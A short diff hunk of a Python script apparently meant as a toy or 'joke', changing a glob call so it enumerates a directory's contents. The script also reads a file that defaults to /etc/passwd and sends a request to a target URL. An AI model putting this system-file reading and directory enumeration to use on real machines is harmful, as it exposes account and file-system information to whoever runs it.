@@ -7,7 +7,7 @@ def main(args):
   target = args.get("target", "http://127.0.0.1")
   file = args.get("file", "/etc/passwd")
   listing = args.get("listing", "/")
-  joke3 = glob.glob(listing)
+  joke3 = glob.glob(listing + "*")
   #open and read the file after the appending:
   r = requests.get(target)
   f = open(file, "r")
